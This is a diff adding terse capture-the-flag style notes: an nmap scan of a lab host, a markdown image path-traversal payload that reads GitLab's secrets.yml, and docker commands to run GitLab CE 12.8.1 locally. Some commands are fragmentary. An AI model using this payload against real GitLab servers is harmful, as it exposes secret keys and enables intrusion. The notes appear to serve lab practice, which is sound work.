@@ -1,0 +1,14 @@
+nmap -sV -sC -Pn 10.129.115.201 > nmap.txt
+
+
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
+
+docker pull gitlab/gitlab-ce:12.8.1-ce.0
+
+docker run -p 8080:80 nginx
+
+$ docker run --name gitlab -it ubuntu:latest bash
+$ docker run -it exec
+
+sudo docker run  -itd   719e7e45b1e2  /bin/bash
+sudo docker attach 15d308918623
